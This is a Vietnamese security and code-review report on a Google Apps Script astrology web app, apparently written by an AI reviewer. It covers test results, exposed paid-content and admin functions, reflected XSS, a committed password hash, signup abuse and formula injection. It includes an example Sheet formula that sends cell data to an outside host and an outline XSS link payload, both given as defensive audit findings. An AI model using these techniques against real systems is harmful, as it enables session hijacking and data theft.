# 01 – Rà soát mã nguồn tuvi-app (16/11/2026)

Chuyên gia: code-reviewer. Phạm vi: 32 file `.gs`, `Script.html` (7.378 dòng, 728 KB), `Index.html`, `Styles.html`, thêm `Holo.html`. Đợt này chỉ rà soát, **không sửa mã, không commit**.

## Tóm tắt (5 dòng)
1. **Nội dung trả phí có lọt ra máy khách khi chưa mua.** Apps Script cho phép trình duyệt gọi thẳng **mọi hàm không có dấu `_` ở cuối tên**. Các hàm tính toán (`luanChiTiet`, `duDoanCuocDoi`, `tongHopLuan`, `phoiNgauLuan`…) đang để công khai, nên ai biết cách có thể tự lấy trọn đại vận, vận năm, nhật vận, biến cố, phối ngẫu và Tổng hợp 6 hệ mà không cần đăng nhập. Đã chạy thử để xác nhận.
2. Có thêm các hàm công khai không kiểm tra đăng nhập: `guiBaoCaoNgay` (trả về email chủ sở hữu, doanh thu và SĐT/email của người mới đăng ký), `guiBanTinThang` (gọi bao nhiêu lần là gửi lại email cho toàn bộ người đăng ký bấy nhiêu lần), `tatVanNgay`/`tatBaoCaoNgay` (tắt dịch vụ đã bán), `getDoanNghiemChung` (lộ kết luận Tổng hợp 6 hệ). Ngoài ra có lỗi XSS phản xạ qua tham số URL (`INITIAL_PARAMS`), kẻ tấn công lợi dụng được để lấy cắp phiên đăng nhập của chủ sở hữu.
3. Phần ví xu và payOS viết chắc: có khóa, đối soát qua API, không ghi trùng đơn, mọi phần escape đúng, 62/62 kiểm thử đạt. Tuy vậy có 2 lỗ hổng nghiệp vụ. Thứ nhất, quà đăng ký 50 xu mở được Trọn đời (49 xu) cho bất kỳ lá số nào chỉ bằng cách tạo tài khoản mới. Thứ hai, **tên đăng nhập toàn số, ví dụ số điện thoại bắt đầu bằng 0, bị Google Sheet đổi thành số**, nên tài khoản đó mất ví, mất phần đã mua và mất lịch sử.
4. Hiệu năng: mỗi lần mở trang tải khoảng 1,1 MB HTML/JS/CSS và không được trình duyệt lưu đệm. Mỗi lần lập lá số máy chủ tính toàn bộ (bản đủ 809 KB), rồi gửi về khách khoảng 424 KB JSON.
5. Kiểm thử: 20/24 file chạy đạt ngay trong repo. 3 file đỏ do thiếu thư viện hoặc giả lập cũ (không phải lỗi mã). Chạy bổ sung trong bản sao nháp thì có `thanh-toan` 62/62 đạt và `van-ngay` 1602/1605 (3 lỗi do kỳ vọng của test đã cũ). **Chưa có kiểm thử nào chặn được lỗi ở ý 1–2.**

---

## A. Kết quả chạy kiểm thử

### A1. Chạy nguyên trạng trong repo: `cd tuvi-app && node tests/<file>`
| File | Kết quả |
|---|---|
| bao-cao.js | đạt 13/13 |
| bat-tu.js | đạt 4008/4008 |
| cai-dat.js | đạt 103/103 |
| chiem-tinh.js | đạt 1820/1820 |
| chuyen-sau.js | đạt 35393/35393 |
| gia-dinh.js | đạt 7863/7863 |
| giai-doan.js | đạt 37/37 |
| ha-lac.js | đạt 8401/8401 |
| ho-so-nam.js | đạt 3867/3867 |
| human-design.js | đạt 2099/2099 |
| lich-su.js | đạt 7/7 |
| nghiem-chung.js | đạt 855/855 |
| phi-tinh.js | đạt 10.890.638/10.890.638 |
| tam-phap.js | đạt 14540 (bỏ qua đối chiếu iztro) |
| than-sat.js | đạt 49754/49754 |
| than-so.js | đạt 2651/2651 |
| tien-ich.js | đạt 50/50 |
| tong-hop.js | đạt 3098/3098 |
| van-ngay.js | đạt 1601/1601 (bỏ qua phần của chủ sở hữu vì chưa có TK_PASS) |
| van-sau.js | đạt 2924/2924 |
| thanh-toan.js | **bỏ qua toàn bộ** ("cần biến TK_PASS") – thoát mã 0 nên trông như đạt |
| doi-chieu.js | ✘ lỗi: thiếu gói `iztro` (chưa `npm ci` trong tests/) |
| thien-van.mjs | ✘ lỗi: thiếu gói `astronomy-engine` |
| tai-khoan.js | ✘ dừng giữa chừng sau 1 kiểm tra: `Utilities.formatDate is not a function` (giả lập riêng của test thiếu hàm này, mã chính không lỗi) |

**Tổng: 20 file đạt, 1 file bỏ qua toàn bộ (thanh-toan), 3 file lỗi do môi trường/giả lập. Không file nào lỗi vì sai logic.**

### A2. Chạy bổ sung trong bản sao nháp (scratchpad, repo không đổi)
- Đã `npm ci` trong `tests/`:
  - `doi-chieu.js` đạt 7/7 nhóm (Thập nhị trực, Hoàng đạo 2099/2100 trong mức lệch cho phép).
  - `tam-phap.js` đạt 14659 (có đối chiếu 119 lá số iztro).
  - `thien-van.mjs`: phần thiên văn và HD đạt (Sao Hỏa lệch tối đa 3,79′; HD 2/3300 cổng khác tham chiếu), rồi dừng ở `ReferenceError: Utilities is not defined` (giả lập trong test đã cũ, chưa theo kịp `LuanGiai.gs:983`).
- Thay `TK_CHU_SEED` bằng một mật khẩu thử, chỉ trong bản sao, không dùng mật khẩu thật:
  - `thanh-toan.js`: **62/62 đạt** ("Thanh toán: tất cả kiểm tra đạt").
  - `van-ngay.js`: **1602/1605**. Ba lỗi đều là kỳ vọng của test đã cũ: test cũ cho rằng chỉ chủ sở hữu nhận email, nhưng từ 23/10 tài khoản thường mua `van_ngay` cũng được gửi, nên `thu.length` là 2 và `guiVanNgay()` trả 2.
  - `tai-khoan.js`: 7 kiểm tra đạt rồi dừng vì `Utilities.formatDate` như trên.

---

## B. Vấn đề và đề xuất

### MỨC CAO

**C1. Nội dung trả phí lấy được bằng cách gọi thẳng hàm tính toán (lỗ hổng chính)**
- Chỗ:
  - `LuanGiai.gs:1042 luanChiTiet`, `DuDoan.gs:370 duDoanCuocDoi`, `TongHop.gs:574 tongHopLuan`, `PhoiNgau.gs:73 phoiNgauLuan`.
  - Các hàm phụ cũng công khai: `tuviLapLaSo`, `batTuLap`, `batTuChiTiet`, `chiemTinhLap/Luan`, `hdLap`, `thanSoHocLap`, `haLacLap/Luan`, `tuviTrinhTu`.
- Vấn đề: `google.script.run` gọi được mọi hàm cấp cao nhất không có `_` ở cuối tên. `lapLaSo` (TaiKhoan.gs:154) cắt phần chưa mua rất cẩn thận (`ttCatPhan_`, `ttCatTongHop_`), nhưng chỉ cần gọi vòng qua các hàm tính toán là có lại toàn bộ.
- Bằng chứng: chạy giả lập, mỗi kết quả đều cho qua JSON giống như trình duyệt nhận:
  - Gọi `luanChiTiet(tuviLapLaSo(i), batTuLap(i), i)` khi không có token: 12 đại vận có đủ lời luận (9,9,9,8… mục), `nguyetVan` 12 tháng, `nhatVan` 7 ngày, `tieuVan.secs` 9 mục. Cũng lá số đó qua `lapLaSo` (khách): đại vận 0 mục, nguyệt vận 0.
  - `duDoanCuocDoi`: trả đủ 7 chủ đề biến cố (khách: 0).
  - `tongHopLuan({...})`: trả `phoiNgau`, `hoiTu`, `xuatThan`, `tinhCach`, `bienCo` (184 KB), tức là trọn gói Trọn đời.
- Đề xuất:
  - Đổi tên mọi hàm tính toán thành dạng riêng tư có `_` (vd. `luanChiTiet_`), hoặc bọc lại thành hàm `_` và chỉ để công khai các API có kiểm `token`.
  - Cập nhật theo: `HAM_CAN_CO`/`BAN_MOI_CAN_CO` (Code.gs:65–100), các lời gọi trong mã, `tools/gia-lap.js` và các test.
  - Thêm test "bề mặt API": liệt kê mọi hàm công khai và so với danh sách cho phép.
- Công sức: M.

**C2. Hàm vận hành công khai, không kiểm tra quyền**
- Chỗ:
  - `ThanhToan.gs:693 guiBaoCaoNgay` trả `{ to, soLieu }`. `soLieu.tkMoi` chứa `lienHe` (SĐT/email) của người mới đăng ký, cùng doanh thu và email chủ sở hữu.
  - `TienIch.gs:475 guiBanTinThang` không chặn gửi trùng trong ngày: gọi N lần là gửi N email cho mọi người còn hạn. Hạn mức MailApp chỉ khoảng 100 email/ngày với tài khoản thường, nên sẽ cạn hạn mức và làm hỏng luôn email nhật vận đã bán.
  - `TienIch.gs:846 tatVanNgay`, `ThanhToan.gs:707 tatBaoCaoNgay`: ai cũng tắt được dịch vụ đã thu tiền.
  - `caiDatVanNgay`, `caiDatBanTin`, `caiDatBaoCaoNgay` (cái sau còn gửi email ngay), `guiVanNgay`, `thuZaloVanNgay`, `ttQuetDonTuDong`, `capQuyenThanhToan`.
  - 18 hàm `test*` (TuViHeThong.gs, Facts.gs, NghiemChung.gs) và `testLapLaSo`: tốn hạn mức chạy.
- Đề xuất:
  - Hàm do trigger gọi thì đặt tên có `_` và trỏ trigger vào tên mới. Lưu ý: tên hàm trigger đã cài phải đổi theo, cần chạy lại `caiDat*` một lần.
  - Hàm chủ sở hữu bấm tay thì thêm kiểm tra `Session.getActiveUser().getEmail() === Session.getEffectiveUser().getEmail()`, hoặc nhận `token` rồi gọi `tkCan_(token, true)`.
  - Bỏ `soLieu` khỏi giá trị trả về.
  - Chuyển các hàm `test*` sang `tests/` hoặc đặt tên có `_`.
- Công sức: S–M.

**C3. XSS phản xạ qua tham số URL → chiếm phiên chủ sở hữu**
- Chỗ: `Code.gs:42` `tpl.initialParams = JSON.stringify(e.parameter)` và `Index.html:559` `<script>var INITIAL_PARAMS = <?!= initialParams ?>;</script>`.
- Vấn đề: `JSON.stringify` không escape chuỗi `</script>`. Một liên kết kiểu `.../exec?ref=</script><script>…</script>` sẽ chạy mã của kẻ tấn công ngay trong trang. Mã đó đọc được `localStorage.tcc_token` rồi gọi `qtDieuChinhXu`, `qtLuuCauHinh` (đổi tài khoản nhận tiền), `datLaiMatKhau`… Liên kết mời `?ref=` vốn được chia sẻ qua Zalo, nên người nhận khó nghi ngờ.
- Bằng chứng: đọc mã. `<?!= ?>` in nguyên văn, không escape.
- Đề xuất: `JSON.stringify(p).replace(/</g, '\\u003c').replace(/ | /g, '')`, hoặc chỉ nhận đúng danh sách khóa cho phép (`name, gender, day…, ref`) với giá trị ngắn, chỉ gồm chữ/số.
- Công sức: S.

**C4. Tên đăng nhập toàn chữ số (vd. số điện thoại) bị Google Sheet đổi thành số → mất ví, mất phần đã mua, mất lịch sử**
- Chỗ:
  - `TaiKhoan.gs:96` (regex cho phép `^[a-z0-9._-]{3,32}$`).
  - Mọi `appendRow([u.ten, …])`: `ThanhToan.gs:178` (Vi), `:322` (MoKhoa), `:387` (DonHang), `ttCongVe_`, `Code.gs` luuLichSu_ (cột Tài khoản).
  - Tìm lại bằng `ttTim_` (TextFinder khớp nguyên ô) và `String(v[1]) !== u.ten`.
- Vấn đề: Sheet tự đổi `"0912345678"` thành số `912345678`. Hậu quả với tài khoản đó:
  - `ttSoDu_` luôn ra 0; mỗi lần cộng xu lại tạo một dòng mới.
  - `muaPhan` báo thiếu xu dù đã nạp.
  - `ttQuyen_` không nhận phần đã mua.
  - `kiemTraDon` báo "Không tìm thấy đơn" (cột tk ≠ `u.ten`).
  - Lịch sử không hiện.

  Tên chỉ có chữ số 0–9 và dấu chấm (`1.5`, `12.30`) cũng bị đổi.
- Bằng chứng: đọc mã. `Code.gs` đã biết chuyện này nên thêm dấu `'` cho ngày (`"'" + s.day…`), nhưng chưa làm cho tên tài khoản. `tools/gia-lap.js` không giả lập việc Sheet đổi chữ thành số nên test không bắt được. **Cần thử 1 tài khoản tên `0912000111` trên Sheet thật để xác nhận.**
- Đề xuất:
  - Đặt định dạng văn bản (`setNumberFormat('@')`) cho cột tài khoản khi `ttSheet_` tạo sheet, hoặc ghi `"'" + u.ten`.
  - Bắt buộc tên đăng nhập có ít nhất 1 chữ cái (`/[a-z]/`).
  - Viết hàm chuyển dữ liệu cho dòng cũ, nếu đã có.
- Công sức: S (thêm M nếu cần chuyển dữ liệu).

**C5. Nuôi tài khoản để lấy nội dung miễn phí + chặn đăng ký**
- Chỗ: `TaiKhoan.gs:113 dangKy`, `ThanhToan.gs:131 ttQuaDangKy_`, `TT_KM_MAC_DINH.dangKy = 50`.
- Vấn đề:
  - Quà đăng ký 50 xu, lớn hơn giá Trọn đời 49 xu. Chỉ cần định dạng SĐT/email hợp lệ, không xác minh. Vậy mỗi lá số cần mở chỉ tốn một tài khoản mới.
  - Mời bạn: tự tạo tài khoản B với mã mời của A thì A được +9 xu, tối đa 30 lần = 270 xu.
  - Bộ đếm `DK_DEM` dùng chung toàn hệ thống (30 lượt/10 phút), nên một người chạy script là chặn đăng ký của mọi người.
- Đề xuất (cần chủ dự án quyết):
  - Quà đăng ký nhỏ hơn giá gói rẻ nhất mở được nội dung chính, hoặc tặng dạng "1 lượt mở Tổng hợp 6 hệ" thay vì xu.
  - Thưởng mời chỉ trả khi người được mời **nạp lần đầu**.
  - Giới hạn theo người dùng thay vì toàn cục: `Session.getTemporaryActiveUserKey()` khi truy cập ẩn danh trả rỗng, nên cần thêm CAPTCHA nhẹ hoặc câu đố.
- Công sức: S–M.

**C6. Mã băm mật khẩu chủ sở hữu nằm trong repo công khai**
- Chỗ: `TaiKhoan.gs:17 TK_CHU_SEED` (salt + SHA-256 lặp 400 vòng).
- Vấn đề: repo đang công khai (jsDelivr `cdn.jsdelivr.net/gh/…` chỉ phục vụ repo công khai). Có salt và hash thì thử mật khẩu ngoại tuyến bằng GPU, khoảng vài chục triệu lượt/giây; mật khẩu 8 ký tự chữ thường + số dò hết trong vài ngày. Mã chỉ dùng seed khi Script Properties chưa có `TK_chienpham`. Nếu chủ sở hữu **chưa từng đổi mật khẩu trong web**, mật khẩu hiện tại chính là mật khẩu ứng với seed.
- Đề xuất:
  - Chủ sở hữu vào web → Tài khoản → **Đổi mật khẩu** ngay (mật khẩu dài ≥ 14 ký tự). Khi đó seed trong repo hết tác dụng.
  - Đợt sau: bỏ seed khỏi mã, khởi tạo chủ sở hữu bằng một hàm chạy tay trong trình soạn thảo; tăng số vòng (vd. 5.000) hoặc thêm "pepper" lưu trong Script Properties.
- Công sức: S.

### MỨC VỪA

**V1. `getDoanNghiemChung` / `nghiemChungLap` công khai làm lộ phần Tổng hợp 6 hệ và biến cố**
- Chỗ: `NghiemChung.gs:25`, `:334`.
- Bằng chứng: khi không có token, nhóm F trả nguyên văn: *"Năm 2017 (27 tuổi): có chuyện tình cảm quan trọng… (3 hệ cùng báo: Tử Vi, Bát Tự, Thần số học)"*, cùng kết luận từng lĩnh vực của Tổng hợp 6 hệ (phần `co_ban`, `bien_co` vốn trả phí). Mỗi lần gọi chạy trọn `lapLaSoDayDu_`, không giới hạn số lần.
- Đề xuất: chủ dự án quyết lấy nghiệm chứng làm "mồi" (giữ miễn phí nhưng chỉ lấy câu kết thúc của năm đã qua) hay bắt đăng nhập. Thêm giới hạn số lần gọi theo token.
- Công sức: S.

**V2. Phần "theo thời gian" trong luận từng hệ vẫn nằm trong bản chưa mua**
- Chỗ: `ttCatPhan_` (ThanhToan.gs:221) chưa cắt các trường sau:
  - `duDoan.vanLon` (7,9 KB): đại vận tốt/xấu nhất kèm lời luận Tứ Hóa đại vận.
  - `battuChiTiet.daiVanCungVi` (2,6 KB): luận từng đại vận Bát Tự.
  - `moRong.haLac.luan.daiVan` (7,6 KB): 12 vận hào có lời luận. Chỉ `cacNam` bị lọc.
  - `chiemTinhLuan.chuKy`/`namXem`/`phanTich` (transit, Solar/Lunar Return).
  - `hd.phanTich.transit/solarReturn/chuKy7`.
  - `thanSo.namNay/thangNay/chuKy` và phân tích năm – tháng – ngày cá nhân.
- Vấn đề: chú thích ở `lapLaSo` nói "luận giải 6 hệ mở cho mọi người", nhưng bảng giá lại bán "đại vận", "vận năm", "nhật vận". Hai điều này chồng nhau, người dùng xem tab Hà Lạc/Bát Tự vẫn đọc được vận.
- Đề xuất: chủ dự án chốt ranh giới (đề xuất: mọi lời luận gắn với *năm/tháng/đại vận cụ thể* thì thuộc gói vận hạn), rồi bổ sung vào `ttCatPhan_` kèm test "khách không có trường X".
- Công sức: M.

**V3. Chèn công thức vào Google Sheet (formula injection)**
- Chỗ:
  - `ghiDoiChieu` (Code.gs:327): ẩn danh, ghi cột `muc` do người dùng gửi.
  - MoKhoa cột 6 `tenLS` (ThanhToan.gs:322).
  - GieoQue cột `cauHoi` (TienIch.gs:268).
  - LaSo cột Họ tên (Code.gs luuLichSu_).
- Vấn đề: chuỗi bắt đầu bằng `=`, `+`, `-`, `@` sẽ thành công thức trong Sheet của chủ sở hữu. Ví dụ `=IMPORTDATA("https://x/?"&B2)` gửi dữ liệu ra ngoài khi Sheet tính lại.
- Đề xuất: hàm chung `ttO_(s)` thêm `'` phía trước nếu chuỗi bắt đầu bằng `=+-@`; giới hạn số lần gọi `ghiDoiChieu` (CacheService).
- Công sức: S.

**V4. Khóa đăng nhập theo tên tài khoản dùng được để chặn chủ sở hữu**
- Chỗ: `TaiKhoan.gs:60–66`.
- Vấn đề: ai cũng gõ sai 5 lần vào `chienpham` là chủ sở hữu bị khóa 15 phút, lặp lại được mãi. Không có giới hạn chung nên vẫn thử được một mật khẩu cho rất nhiều tài khoản. Khi tài khoản không tồn tại thì không chạy băm, nên đo thời gian phản hồi là biết tên nào có thật (đăng ký cũng báo "đã tồn tại").
- Đề xuất: không khóa cứng với tài khoản chủ sở hữu, thay bằng làm chậm tăng dần; vẫn chạy `tkBam_` giả khi `!o`.
- Công sức: S.

**V5. Khóa lá số phụ thuộc chuỗi họ tên chưa chuẩn hóa Unicode**
- Chỗ: `ThanhToan.gs:194 ttKhoaLaSo_`.
- Vấn đề: "Nguyễn" dạng dựng sẵn (NFC) và dạng tổ hợp (NFD, hay gặp khi dán từ iPhone hoặc Zalo) cho ra khóa khác nhau, nên người đã mua nhập lại tên thì mất quyền xem.
- Đề xuất: `ten.normalize('NFC')`, kèm hàm tương thích ngược: thử khóa cũ nếu khóa mới không có quyền.
- Công sức: S.

**V6. PDF đầy đủ (19 xu) chỉ chặn ở giao diện**
- Chỗ: `Script.html:5768 khoaPdf`.
- Vấn đề: PDF dựng ở trình duyệt từ dữ liệu đã có, nên ai sửa `state.result.quyen.pdf` trong DevTools là xuất được. Phần đã cắt ở máy chủ vẫn không lộ, nên mức thiệt hại thấp hơn C1.
- Đề xuất: chấp nhận rủi ro, hoặc đổi gói "PDF" thành "bìa + thương hiệu" do máy chủ ký (vd. máy chủ trả mã xác nhận để in lên PDF).
- Công sức: S (nếu chấp nhận) / M.

**V7. Trang cho phép mọi web khác nhúng (clickjacking)**
- Chỗ: `Code.gs:46 setXFrameOptionsMode(ALLOWALL)`.
- Vấn đề: web lạ nhúng được trang đã đăng nhập vào khung trong suốt rồi dụ người dùng bấm "Mở khóa" (dù vẫn còn hộp `confirm`). `NghiemChungUI` đã cố ý không bật.
- Đề xuất: bỏ ALLOWALL nếu không nhúng vào Google Sites.
- Công sức: S.

**V8. Kiểm thử quan trọng nhất bị bỏ qua mặc định**
- Chỗ: `tests/thanh-toan.js:63`, `tai-khoan.js`, `van-ngay.js`.
- Vấn đề: cần `TK_PASS` (mật khẩu thật). Phiên Claude không có mật khẩu này nên ví xu không được kiểm tra trước mỗi lần đẩy mã.
- Đề xuất: trong test, ghi đè `TK_CHU_SEED` bằng seed thử (salt/hash của một mật khẩu giả) như đã làm trong A2. Sửa thêm giả lập `Utilities.formatDate` trong `tai-khoan.js` và `thien-van.mjs`; sửa 3 kỳ vọng cũ của `van-ngay.js`.
- Công sức: S.

**V9. Hiệu năng tải trang và payload**
- Bằng chứng:
  - Mỗi lần mở trang tải khoảng 1,09 MB: Script.html 728 KB, Styles.html 255 KB, Holo.html 60 KB, Index.html 49 KB. Tất cả được nhúng vào trang qua `include()`, nên trình duyệt **không lưu đệm** giữa các lần mở.
  - Một lần `lapLaSo` cho khách trả 424 KB JSON. Máy chủ vẫn tính bản đủ (809 KB, khoảng 0,6–0,9 s trên Node, trên Apps Script chậm hơn nhiều lần) rồi mới cắt.
  - Mỗi lần lập lá số đều gửi kèm `saoInfo` (5,9 KB), dù đây là dữ liệu tĩnh.
  - Tab nghiệm chứng gọi `getDoanNghiemChung`, chạy lại trọn `lapLaSoDayDu_` cho cùng lá số.
- Đề xuất:
  - Chuyển Script/Styles lên jsDelivr theo mã lần lưu, như ảnh đang làm, để trình duyệt lưu đệm (cần kiểm chứng CSP của Apps Script; ảnh và cdnjs đã chạy được).
  - Đưa `saoInfo` vào mã giao diện.
  - Khi khách chưa mua, bỏ qua các phần sẽ bị cắt ngay từ lúc tính (truyền `q` vào `lapLaSoDayDu_`).
  - Nghiệm chứng dùng lại `state.result`.
- Công sức: M–L.

### MỨC THẤP

- **T1. Mã chết và chú thích lỗi thời:**
  - `khachRutGon_` (TaiKhoan.gs:183) không còn ai gọi; 21 chỗ `R.khach`/`.khach` trong Script.html không bao giờ đúng nữa.
  - Đầu file TaiKhoan.gs vẫn ghi "khách chỉ nhận bản rút gọn", trái với cách làm hiện tại.
  - Danh sách file ở đầu Code.gs chỉ còn 11/32 file.
  - README ghi Gia đình "chỉ chủ sở hữu", nhưng `giaDinhDs` cho mọi thành viên đã đăng nhập.
  - `tienIch.co()` còn mã kiểm quyền từng phần, dù mọi tiện ích đã miễn phí.

  Công sức: S.
- **T2. Trùng lặp:**
  - `var PT_THUY_` khai báo 2 lần (TuViPhiTinh.gs:1721 và 1734).
  - Hai đường dẫn CDN ảnh ghim ở hai mã lần lưu khác nhau (Script.html `@19203fb…`, Holo.html `@87e4618…`).
  - "Patch 8G" trong Script.html:7090 tự khai báo lại `$`, `hasServer` và một form nhập riêng.

  Công sức: S.
- **T3. File quá lớn, khó bảo trì:** TuViHeThong.gs 376 KB, TuViPhiTinh.gs 350 KB, Script.html 7.378 dòng trong một IIFE. Đề xuất tách Script.html theo tab (ScriptTuVi, ScriptVanHan…, nhúng bằng `include`), sau đó mới chuyển lên CDN. Công sức: L.
- **T4. Thư viện CDN không có `integrity`:** `Index.html:560–561` (html2canvas 1.4.1, jsPDF 2.5.1). Đề xuất thêm `integrity` + `crossorigin`. Công sức: S.
- **T5. `innerHTML` nhận văn từ máy chủ mà không escape:** vd. Script.html, phần nghiệm chứng `d.text`, `d.ten`. Hiện văn do máy chủ sinh nên chưa khai thác được: đã thử Playwright với tên `"><img onerror>` trên cả 15 tab, cả vai khách lẫn chủ sở hữu, kết quả **0 lần chạy mã, mọi chỗ đều escape**. Nên escape cho chắc. Công sức: S.
- **T6. Tính giá còn kẽ hở nhỏ:**
  - `tron_goi` và `dong_hanh` trừ tiền "phần đã mua" theo giá hiện hành, kể cả phần mở bằng lượt gia đình 0 xu.
  - `muaPhan` vẫn nhận `van_ngay`: trừ xu nhưng không có tác dụng gì.
  - `orderCode` = 8 số cuối `Date.now()` + 2 số ngẫu nhiên, có thể trùng nếu hai đơn tạo cùng một mili giây.

  Công sức: S.
- **T7. Bảo mật phiên:**
  - Đổi mật khẩu không hủy các phiên khác.
  - Token để trong `localStorage`, nên sau khi sửa C3 cần thêm CSP chặt hơn (Apps Script hạn chế).

  Công sức: S.

### Điểm làm tốt (nên giữ)
- Ví xu: mọi lần cộng/trừ đều trong `LockService` (`ttKhoa_`), ghi sổ cái từng dòng, chặn số dư âm.
- `ttGhiNhanDon_` ghi đơn đúng một lần (kiểm `DA_TRA` trong khóa).
- payOS: đối soát bằng API có khóa ở máy chủ và kiểm `amountPaid >= tien`, không tin dữ liệu từ trình duyệt.
- Quản trị trả `clientId` rút gọn, không lộ `apiKey`/`checksum` (đã có test).
- Mọi API quản trị đều kiểm `tkCan_(token, true)`. Các tab Phi Tinh và 👑 kiểm chủ sở hữu ở máy chủ. Dò giờ (`ttCanPhan_`) và Cặp đôi (`cdRutGon_`) chặn ở máy chủ.
- Escape HTML làm đều tay: hàm `esc()` dùng nhất quán, kể cả bảng quản trị hiển thị `hienThi`/`lienHe` do người lạ nhập.
- Mật khẩu so sánh thời gian hằng (`tkBang_`); có giới hạn số lần nhập mã quà và tạo đơn.

---

## C. Đề xuất chia đợt sửa
1. **Đợt 0 (chủ dự án tự làm, 5 phút):** đổi mật khẩu chủ sở hữu trong web (C6). Thử tạo một tài khoản tên toàn số để xác nhận C4.
2. **Đợt 1 – Bảo mật khẩn (S–M, 1 lần đẩy mã):**
   - Đổi các hàm tính toán, trigger và test thành dạng riêng tư `_` (C1, C2).
   - Escape `INITIAL_PARAMS` (C3).
   - Định dạng văn bản cho cột tài khoản, bắt buộc tên có chữ cái (C4).
   - Chống chèn công thức (V3).
   - Bỏ ALLOWALL (V7).
   - Thêm test "bề mặt API công khai", test "khách không nhận trường trả phí", test seed giả cho thanh-toan (V8).
3. **Đợt 2 – Nghiệp vụ bán hàng (cần chủ dự án quyết):** quà đăng ký và thưởng mời (C5), ranh giới nội dung theo thời gian (V2), nghiệm chứng làm mồi (V1), PDF (V6), chuẩn hóa tên (V5), khóa đăng nhập (V4).
4. **Đợt 3 – Hiệu năng & bảo trì (M–L):** CDN cho Script/Styles, payload nhẹ, tính theo quyền (V9); dọn mã chết, chú thích (T1–T2); tách Script.html (T3); SRI (T4).
